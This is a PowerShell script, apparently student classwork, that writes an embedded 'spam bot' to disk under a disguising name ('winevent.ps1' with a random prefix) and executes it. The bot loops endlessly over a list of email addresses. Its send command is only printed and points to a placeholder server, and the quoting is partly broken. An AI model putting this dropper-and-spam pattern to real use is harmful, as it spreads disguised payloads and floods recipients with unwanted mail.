<# 

    Storyline: Dropper for our spam bot, this will save to a directory and then execute it

#>

# Created a heredoc, everythin in the '' is the heredoc (lines 9-31)
$writeSbBot = @"

# Send an email using powershell

# To create an array
$toSend = @('d@champlain.edu', 'ston@champlain.edu', 'duns@champlain.edu')
# Message body
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# Send the email to one person
#Write-Host "Send-MailMessage -From "dunston@champlain.edu" -To 'dunston@champlain.edu' '-Subject 'Tisk Tisk' -Body $msg -SmtpServer x.x.x.x"

# While loop maks sure code repeats in order to spam people
while ($true) {
    # Send the email to multiple people
    foreach ($email in $toSend) {
        # Send the email to multiple people
        Write-Host "Send-MailMessage -From "dunston@champlain.edu" -To '$email' -Subject 'Tisk Tisk' '
        -Body $msg -SmtpServer x.x.x.x"

        # Makes spam bot pause for 1 second in order to not overwhealm your computer
        start-sleep 1

    }
}
"@

# Directory to write the bot to
$sbDir = "C:\Users\sarah.fornaldes\Desktop\SYS320\Week10\Classwork\"

# Create a random number to add to the fle
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and the location to save the bot
$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file
$writeSbBot | out-file -FilePath $file
# After you run this in terminal type dir and tab to see file name. Then type cat and the file name to see the spam bot

# Executes the powershell script
Invoke-expression $file